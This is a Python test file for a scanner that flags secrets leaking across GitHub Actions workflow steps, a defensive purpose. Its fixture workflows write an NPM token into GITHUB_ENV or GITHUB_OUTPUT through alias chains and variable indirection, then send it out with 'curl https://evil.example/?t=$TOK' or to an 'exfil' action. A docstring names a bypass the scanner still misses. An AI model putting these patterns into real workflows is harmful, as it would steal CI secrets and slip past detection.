"""Tests for the previously-documented GHA evasion gaps now closed:

  * Chained alias — ``A=$GITHUB_ENV; B=$A; ... >> $B``
  * Variable indirection — ``T=GITHUB_ENV; ... >> ${!T}``

Quote-concatenation indirection (``T="$"; ... >> "${T}GITHUB_ENV"``)
remains documented as out-of-scope; an adversarial test for it
isn't included because closing it would require evaluating
arbitrary string concatenations at parse time.
"""

from __future__ import annotations

from pathlib import Path

from packages.sca.supply_chain.gha_secret_flow import scan_target


def _write_wf(tmp_path: Path, body: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    p = wf_dir / "wf.yml"
    p.write_text(body, encoding="utf-8")
    return p


def _downstream_fires(hits, idx: int) -> bool:
    return any(
        h.sink_kind == "run_block" and h.step_index == idx
        for h in hits
    )


# ---------------------------------------------------------------------------
# Chained alias
# ---------------------------------------------------------------------------

def test_two_hop_chained_alias_propagates(tmp_path: Path) -> None:
    """``A=$GITHUB_ENV; B=$A; ... >> $B`` — two-hop alias chain."""
    _write_wf(tmp_path, """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          A=$GITHUB_ENV
          B=$A
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> $B
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_three_hop_chained_alias_propagates(tmp_path: Path) -> None:
    """``A=$T; B=$A; C=$B; ... >> $C`` — three hops still resolves."""
    _write_wf(tmp_path, """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          A=$GITHUB_ENV
          B=$A
          C=$B
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> $C
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


# ---------------------------------------------------------------------------
# Variable indirection — ${!VAR}
# ---------------------------------------------------------------------------

def test_variable_indirection_to_github_env_propagates(
    tmp_path: Path,
) -> None:
    """``T=GITHUB_ENV; ... >> ${!T}`` — bash variable indirection."""
    _write_wf(tmp_path, """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          T=GITHUB_ENV
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> ${!T}
      - run: curl https://evil.example/?t=$TOK
""")
    hits = scan_target(tmp_path, [], [])
    assert _downstream_fires(hits, 1)


def test_variable_indirection_to_github_output(tmp_path: Path) -> None:
    """Same shape for ``$GITHUB_OUTPUT``."""
    _write_wf(tmp_path, """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: launder
        run: |
          T=GITHUB_OUTPUT
          echo "TOK=${{ secrets.NPM_TOKEN }}" >> ${!T}
      - uses: nobody/exfil@v1
        with:
          payload: ${{ steps.launder.outputs.TOK }}
""")
    hits = scan_target(tmp_path, [], [])
    assert any(h.sink_kind == "untrusted_action" for h in hits)


# ---------------------------------------------------------------------------
# Non-aliased var holding a non-target literal — no FP
# ---------------------------------------------------------------------------

def test_var_with_unrelated_literal_does_not_alias(tmp_path: Path) -> None:
    """``T=SOMETHING_ELSE; ... >> ${!T}`` — T doesn't hold the
    target name, so no aliasing should occur."""
    _write_wf(tmp_path, """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          T=DECOY
          echo "VAL=${{ secrets.NPM_TOKEN }}" >> ${!T}
      - run: echo "$VAL"
""")
    hits = scan_target(tmp_path, [], [])
    # The first step DOES have a secret-literal reference in the
    # body so it produces a run_block finding.  But step 1 has no
    # propagated binding (because T didn't alias) so step 1 fires
    # nothing from the cross-step path.
    assert not _downstream_fires(hits, 1)
